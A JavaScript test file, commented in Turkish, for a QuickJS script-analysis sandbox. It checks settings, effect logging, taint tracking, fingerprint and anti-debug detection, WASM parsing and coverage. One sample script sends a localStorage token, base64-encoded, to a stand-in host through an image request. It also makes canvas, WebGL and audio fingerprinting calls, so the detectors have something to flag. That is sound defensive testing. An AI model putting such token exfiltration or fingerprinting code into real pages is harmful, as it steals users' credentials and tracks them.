// Sandbox çalışma anı öz-denetimi: node test/sandbox-runtime.test.js
// C46/C50/C53/C54/C55/C61/C62/C63/C64/C66/C67/C70/C188, E729–E732, E749, E750
import assert from 'node:assert/strict';
import { getQuickJS } from 'quickjs-emscripten';
import { createHost, sandboxApi } from '../src/sandbox/core.js';
import { captureRun, coverageRun, dynamicReport } from '../src/sandbox/dynamic.js';
import { validateSettings, toConfig, applySettings, defaultSettings } from '../src/sandbox/settings.js';
import { parseWasm, findEmbeddedWasm } from '../src/sandbox/wasm.js';
import { antiDebugScan, instrument } from '../src/sandbox/instrument.js';

const host = createHost(await getQuickJS(), { plugins: [{ name: 'host-plugin', prelude: 'globalThis.__hp = 7;', collect: '__hp' }] });
const sb = sandboxApi(async (m) => host.handle(m));

// ayarlar: profil, zaman makinesi, çerez/depolama, sahte yanıt, sınırlar; geçersiz alanlar reddedilir
const { settings, errors } = validateSettings({ profile: 'headless-bot', now: '2030-01-02T03:04:05Z', seed: 7, cookie: 'a=1\nb', storage: { k: 'v' },
  responses: [{ match: '/api', status: 201, body: '{"x":1}' }, { match: '' }], memoryMB: 4096, timeoutMs: 10, verifyLevel: 'proof', watch: ['navigator.userAgent', 'bad path'] });
assert.deepEqual(errors, []);
assert.equal(settings.memoryMB, 1024);
assert.equal(settings.timeoutMs, 500);
assert.equal(settings.cookie, 'a=1b');
assert.equal(settings.responses.length, 1);
assert.deepEqual(settings.watch, ['navigator.userAgent']);
assert.equal(validateSettings({ profile: 'nope' }).errors.length, 1);
const cfg = toConfig(settings);
assert.equal(cfg.now, Date.parse('2030-01-02T03:04:05Z'));
assert.equal(cfg.profile.navigator.webdriver, true);
const msg = applySettings({ type: 'run', code: '' }, settings);
assert.equal(msg.memoryMB, 1024);
assert.equal(msg.timeoutMs, 500);
assert.deepEqual(applySettings({ type: 'run', config: { x: 1 } }, settings).config, { x: 1 }, 'açık yapılandırma ezilmez');
assert.deepEqual(applySettings({ type: 'close' }, defaultSettings()), { type: 'close' });

const env = await sb.run(`console.log(new Date().getUTCFullYear(), navigator.webdriver, document.cookie, localStorage.getItem('k'));
  fetch('https://x.test/api').then(function (r) { return r.json(); }).then(function (j) { console.log(j.x); });`, { config: cfg });
assert.deepEqual(env.out, ['2030 true a=1b v', '1']);

// E729/E731: etki günlüğü; okuma/yazma tuzakları; E749 telemetri; C188 bellek; E750 eklentiler
const fx = await sb.run(`document.cookie = "z=1"; localStorage.setItem("q", "w"); console.log("hi"); history.pushState({}, "", "/p");`,
  { plugins: [{ name: 'msg-plugin', prelude: 'globalThis.__mp = "ok";', collect: '({ mp: __mp, hp: __hp })' }] });
const kinds = fx.effects.map((e) => e.kind);
for (const k of ['cookie.write', 'storage.write', 'console', 'history']) assert.ok(kinds.includes(k), k);
assert.deepEqual(fx.extra['msg-plugin'], { mp: 'ok', hp: 7 });
assert.equal(fx.extra['host-plugin'], 7);
assert.ok(fx.mem.used > 0 && fx.mem.limit === 64 * 1024 * 1024);
const tel = (await sb.telemetry()).telemetry;
assert.ok(tel.messages.run.count >= 2 && tel.peakMemory > 0);
assert.ok(Array.isArray(tel.recent) && tel.recent.length >= 2);

// E730: onRead/onWrite/onCall kanca API'si ve bildirimsel izleme
const hooks = await sb.run(`var log = [];
  __peel.onCall("localStorage.setItem", function (i) { log.push("call:" + i.args[0]); });
  __peel.onWrite("document.title", function (i) { log.push("write:" + i.value); });
  __peel.onRead("navigator.language", function (i) { log.push("read:" + i.value); });
  localStorage.setItem("a", 1); document.title = "T"; navigator.language; console.log(log.join(","));`, { config: { watch: ['navigator.platform'] } });
assert.deepEqual(hooks.out, ['call:a,write:T,read:en-US']);

// C54 taint + E732 gölge bellek, C55 üretilen kod, C53 parmak izi, C64 WASM, C66 worker
const cap = await captureRun(sb, `
  var ua = navigator.userAgent;
  new Image().src = "https://t.test/p?d=" + btoa(localStorage.getItem("token"));
  var c = document.createElement("canvas"); c.getContext("2d").fillText("fp", 1, 1); c.toDataURL();
  var gl = c.getContext("webgl"); gl.getParameter(gl.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL);
  new OfflineAudioContext(1, 44100, 44100).startRendering();
  function local() { var secret = 5; return eval("secret + 1"); } console.log(local());
  window["eval"]("console.log('indirect')"); setTimeout("console.log('str timer')"); new Function("return 2")();
  document.write("<script>console.log('dw')<\\/script>");
  var bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,2,127,127,1,127,2,11,1,3,101,110,118,3,97,100,100,0,0,7,7,1,3,114,117,110,0,0]);
  WebAssembly.instantiate(bytes, { env: { add: function () {} } }).then(function (r) { r.instance.exports.run(3, 4); });
  var w = new Worker("data:text/javascript," + encodeURIComponent("self.onmessage = function (e) { postMessage({ echo: e.data, ww: typeof window }); }"));
  w.onmessage = function (e) { console.log("w:" + JSON.stringify(e.data)); };
  w.postMessage("ping");
`, { storage: { token: 'tok-12345' } });
assert.ok(cap.ok, cap.error);
assert.ok(cap.taint.some((x) => x.source === 'localStorage:token' && x.via === 'base64' && x.sink === 'image'), 'taint akışı');
assert.ok(cap.console.includes('6'), 'doğrudan eval yerel kapsamı korur');
const vias = cap.dynamicCode.map((d) => d.via);
for (const v of ['eval', 'setTimeout', 'Function', 'document.write']) assert.ok(vias.includes(v), v);
assert.ok(cap.dynamicCode.some((d) => d.code === "console.log('indirect')"));
const fpApis = cap.fingerprint.map((f) => f.api);
for (const a of ['canvas.fillText', 'canvas.toDataURL', 'webgl.getParameter', 'audio.startRendering']) assert.ok(fpApis.includes(a), a);
assert.equal(cap.wasm[0].imports[0].signature, '(i32, i32) -> i32');
assert.deepEqual(cap.wasm[0].calls, [{ name: 'run', args: ['3', '4'] }]);
assert.equal(cap.workers[0].rounds[0].replies[0], '{"echo":"ping","ww":"undefined"}', 'worker ayrı ve penceresiz sandbox');
assert.ok(cap.console.includes('w:{"echo":"ping","ww":"undefined"}'), 'yanıt ana programa döner');

// C64 statik: gömülü modül ve ayrıştırıcı
const mod = Uint8Array.from([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 5, 3, 1, 0, 2, 7, 13, 2, 1, 102, 0, 0, 3, 109, 101, 109, 2, 0, 10, 4, 1, 2, 0, 11]);
const info = parseWasm(mod);
assert.deepEqual(info.exports.map((e) => `${e.name}:${e.kind}`), ['f:func', 'mem:memory']);
assert.equal(info.memories[0].min, 2);
assert.throws(() => parseWasm(new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8])), /asm/);
const b64 = Buffer.from(mod).toString('base64');
assert.equal(findEmbeddedWasm(`var m = "${b64}";`)[0].exports.length, 2);

// C61/C62/C63: coverage, çağrı grafiği, döngü ve sonsuz döngü, anti-debug
const cov = await coverageRun(sb, 'function sq(x) { return x * x; }\nfunction run() {\n  for (var i = 0; i < 4; i++) sq(i);\n  if (i < 0) {\n    console.log("never");\n  }\n}\nrun();\ndebugger;');
assert.ok(cov.ok, cov.error);
assert.equal(cov.functions.find((f) => f.name === 'sq').calls, 4);
assert.ok(cov.callGraph.edges.some((e) => cov.functions[e.from]?.name === 'run' && cov.functions[e.to].name === 'sq' && e.count === 4));
assert.deepEqual(cov.lines.find(([l]) => l === 5), [5, 0], 'çalışmayan satır');
assert.equal(cov.loops[0].iterations, 4);
assert.deepEqual(cov.debuggerHits, [{ line: 9, hits: 1 }]);
const spin = await coverageRun(sb, 'function spin() {\n  var x = 0;\n  while (x >= 0) { x = (x + 1) % 5; }\n}\nspin();', {});
assert.equal(spin.timedOut, true);
assert.equal(spin.infinite.loop.line, 3);
assert.equal(spin.infinite.stack[0].name, 'spin');
const traps = antiDebugScan('setInterval(function () { debugger; }, 50); if (window.outerWidth - window.innerWidth > 160) location.reload(); var t = Date.now(); if (Date.now() - t > 100) {} for (;;) {}').map((x) => x.kind);
for (const k of ['timer-debugger', 'devtools-size', 'reaction', 'timing-check', 'infinite-loop']) assert.ok(traps.includes(k), k);
assert.ok(instrument('class A extends Object { constructor() { super(); } m() { return 1; } }').map.fns.length === 2);

const rep = await dynamicReport({ sandbox: sb, text: 'console.log(1)', output: 'console.log(1)' });
assert.ok(rep.capture.ok && rep.coverage.ok && rep.telemetry);
assert.ok(!Object.keys(rep).includes('code') && rep.code.text === 'console.log(1)', 'kaynak JSON dışında');
console.log('sandbox-runtime: ok');
